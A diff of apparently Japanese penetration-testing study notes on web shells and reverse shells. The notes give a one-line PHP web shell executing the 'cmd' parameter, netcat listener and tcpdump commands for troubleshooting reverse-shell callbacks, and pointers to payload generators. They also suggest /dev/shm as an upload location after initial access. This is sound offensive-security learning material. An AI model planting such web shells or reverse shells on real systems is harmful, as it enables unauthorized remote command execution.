@@ -55,7 +55,7 @@ $$WebShell実行例$$
 
 🪟Windows：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]
 
-とらぶるReverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
+トラブルシューティング: Reverse Shell を実行したのに接続が確立しない場合、FWなどにより遮断されていないか、問題の切り分けに使う
 ```zsh
 # Attacker
 sudo tcpdump -nni any host <attacker_IP> and port 4444
@@ -66,6 +66,10 @@ sudo nc -lvnp 4444
 ```
 - 何も表示されない場合は、コマンドが実行されていないか、FWで遮断
 - SYNパケットのみ届く場合は、ポート番号が誤っている
+
+> [!INFO]
+> - Kali にはデフォルトで`/usr/share/WebShells`にプログラム言語ごとにさまざまなリバースシェルペイロードが用意されている。
+> - [Reverse Shell Generator](https://www.revshells.com/)を使うと、環境に合わせたペイロードが生成できる。
 
 ---
 
@@ -82,8 +86,7 @@ sudo nc -lvnp 4444
 - Webアプリケーションにペイロードをアップロードできても、phpでは、`shell_exec`の無効化などにより、`?cmd=id`などが実行できないことがある
 	- →[[#トラブルシューティング]]
 
-## 💡Tips
-
+## 💡Tip
 
 - Linuxシステムにおけるファイルアップロード先として、初期侵入後は`/dev/shm`がベスト（webから読み込めるのであれば）
 	- *PrivateTmp*の影響を受けないから
@@ -140,14 +143,13 @@ http://example/config.php
 
 ## PHP
 
-### 基本コマンド
+### 基本スクリプト
 
 ```php
 <?php echo system($_GET["cmd"]); ?>
-# 例：http://example.com/page?cmd=id
 ```
 
-### ターゲット状態確認コマンド
+### ターゲット状態確認スクリプト
 
 - cmd引数でコマンド実行できないとき、現在の状態確認
 - phpinfoの内容、コマンド実行に必要なphp関数の有効有無
